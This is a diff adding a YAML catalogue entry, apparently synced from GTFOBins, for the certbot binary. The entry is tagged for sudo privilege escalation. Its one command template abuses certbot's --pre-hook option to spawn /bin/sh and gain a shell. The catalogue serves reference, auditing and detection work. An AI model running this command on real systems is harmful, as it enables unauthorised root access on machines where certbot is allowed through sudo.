@@ -1,0 +1,26 @@
+id: gtfobins/certbot/shell/sudo
+type: binary
+platform: linux
+name: certbot
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir
+    . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
+  comment: This needs a writable directory, replace `.` if needed.
+references:
+- https://gtfobins.github.io/gtfobins/certbot/
+tags:
+- linux
+- unix
+- gtfobins
